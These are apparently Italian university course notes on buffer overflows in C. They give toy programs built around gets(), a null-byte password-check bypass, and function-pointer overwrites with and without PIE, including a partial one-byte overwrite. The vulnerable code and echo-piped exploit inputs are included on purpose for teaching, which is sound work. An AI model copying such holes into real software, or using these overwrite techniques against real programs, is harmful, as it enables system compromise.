Questa vulnerabilità è causata da una programmazione **unsafe**, programmare in modo "sicuro" infatti non è garantito da molti linguaggi (e.g. C), per questo sono importati dei meccanismi di **mitigazione**.

>[!info] **Buffer overflow**
>A condition at an interface under which more input can be placed into a buffer or data holding area than the capacity allocated, overwriting other information. Attackers exploit such a condition to crash a system or to insert specially crafted code that allows them to gain control of the system.
>SOURCE: [SP 800-28; CNSSI-4009](https://nvlpubs.nist.gov/nistpubs/ir/2013/NIST.IR.7298r2.pdf)

Panoramica di C:

| Vantaggi                      | Svantaggi                                                               |
| ----------------------------- | ----------------------------------------------------------------------- |
| Accesso completo alle risorse | Accesso ai dati in modo non sicuro                                      |
| Elevata performance           | È responsabilità del programmatore implementare meccanismi di sicurezza |
|                               | Ci sono molte funzioni unsafe nella stl                                 |

```c
#include <string.h>
#include <stdio.h>
char buffer1[8]="one"; // buffer of size 8 initialized with "one"
int value = 5;
char buffer2[8]="two"; // buffer of size 8 initialized with "two"
int main(int argc, char *argv[]) {
	printf("[BEFORE] buffer1 @ %1$p = %1$s\n", buffer1);
	printf("[BEFORE] value @ %1$p = 0x%2$08x\n",&value, value);
	printf("[BEFORE] buffer2 @ %1$p = %1$s\n", buffer2);
	
	printf("Please enter your input: ");
	gets(buffer1); // reads input into buffer1, whatever length!
	printf("\n");
	printf("[AFTER] buffer1 @ %1$p = %1$s\n", buffer1);
	printf("[AFTER] value @ %1$p = 0x%2$08x\n",&value, value);
	printf("[AFTER] buffer2 @ %1$p = %1$s\n", buffer2);
}
```

Notare come $7$ caratteri stiano dentro al buffer, con $9$ straripa completamente scrivendo il valore `0x39` che è il carattere ASCII per `9`, mentre da $17$ caratteri in poi va a scrivere dentro al secondo buffer:
```bash
[BEFORE] buffer1 @ 0x6b90f0 = one
[BEFORE] value   @ 0x6b90f8 = 0x00000005
[BEFORE] buffer2 @ 0x6b9100 = two
Please enter your input: 1234567
[AFTER]  buffer1 @ 0x6b90f0 = 1234567
[AFTER]  value   @ 0x6b90f8 = 0x00000005
[AFTER]  buffer2 @ 0x6b9100 = two

[BEFORE] buffer1 @ 0x6b90f0 = one
[BEFORE] value   @ 0x6b90f8 = 0x00000005
[BEFORE] buffer2 @ 0x6b9100 = two
Please enter your input:
[AFTER]  buffer1 @ 0x6b90f0 = 123456789
[AFTER]  value   @ 0x6b90f8 = 0x00000039
[AFTER]  buffer2 @ 0x6b9100 = two

[BEFORE] buffer1 @ 0x6b90f0 = one
[BEFORE] value   @ 0x6b90f8 = 0x00000005
[BEFORE] buffer2 @ 0x6b9100 = two
Please enter your input: 12345678999999999
[AFTER]  buffer1 @ 0x6b90f0 = 12345678999999999
[AFTER]  value   @ 0x6b90f8 = 0x39393939
[AFTER]  buffer2 @ 0x6b9100 = 9
```

Se mettessimo una stringa ancora più lunga prima o poi otterremmo un `segmentation fault`, la colpa di questo _buffer overflow_ è dovuta alla funzione `gets()` la quale è legacy ed unsafe.

Prendendo in considerazione questo codice:
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
char buffer1[8]="......."; // buffer of size 8 for input
char buffer2[8]="sEgr3t0"; // buffer of size 8 initialized with the password
int main(int argc, char *argv[]) {
	printf("Insert password: ");
	gets(buffer1); // reads the user password, no check on length!
	if (strcmp(buffer1, buffer2) == 0) {
		printf("Authenticated!\n");
		exit(EXIT_SUCCESS);
	} else {
		printf("Wrong password!\n");
		exit(EXIT_FAILURE);
	}
}
```

È possibile bypassare il controllo della password inserendo `0x00` tra due stringhe di `buffer2.length()` caratteri:
```bash
echo -e "AAAAAAA\x00AAAAAAA" | ./overflow-pwd
```

### Position Independent Executionable (PIE)
Immaginando di avere il seguente codice:
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
typedef struct element {
	char data[16];
	void (*f)(char *);
} element_t;

void secret_function() {
	printf("Secret function!\n");
}

void show_data(char *s) {
	printf("Data = %s\n",s);
}

int main(int argc, char *argv[]) {
	element_t e;
	e.f = show_data;
	printf("Insert data: ");
	gets(e.data); // reads data, unsafe!
	e.f(e.data);
}
```

E compilandolo con:
```bash
gcc overflow-struct.c -o overflow-struct --no-pie --static
```
andiamo a disabilitare **PIE**, il quale viene usato per posizionare in modo casuale il programma in memoria , in questo modo possiamo trovare facilmente l'indirizzo in memoria della funzione `e.f()`.

Otteniamo l'indirizzo di `secret_function`:
```bash
gdb -q overflow-struct
(gdb) disas secret_function
Dump of assembler code for function secret_function:
   0x0000000000400b4d <+0>:     push   rbp
   ...
```

procediamo riempiendo il buffer `data[]`, e poi inseriamo l'indirizzo della funzione che vogliamo eseguire:
```bash
# little endian
echo -e "AAAAAAAAAAAAAAAA\x4d\x0b\x40\x00\x00\x00\x00\x00"
Insert data: Secret function!
```

La locazione casuale del programma (PIE) riduce l'esposizione a questo tipo di attacchi, tuttavia questa vulnerabilità può ancora essere abusata, in quanto la randomizzazione "mantiene" gli [[Mapping#Mapping|offset]].

Modificando il main come segue:
```c
int main(int argc, char *argv[]) {
	element_t e;
	e.f = show_data;
	char c;
	printf("Insert data: ");
	memset(e.data,0,sizeof(e.data));
	
	for (int i=0; i<=sizeof(e.data) && (c=getc(stdin))!= EOF && c != '\n'; i++) {
		e.data[i] = c;
	}
	gets(e.data); // reads data, unsafe!
	e.f(e.data);
	
	printf("show_data = %p, secret_function = %p\n",show_data,secret_function);
}
```

```bash
echo -e "AAAAAAAAAAAAAAAA\xca" | ./overflow-struct-offbyone
Insert data: Secret function!
show_data = 0x560975daa7dd, secret_function = 0x560975daa7ca
```
è solo necessario sovrascrivere l'ultimo byte con `0xca`, il quale è il primo byte in memoria a causa del **little endian**, in pratica stiamo solo eseguendo uno shift del puntatore alla funzione che vogliamo.



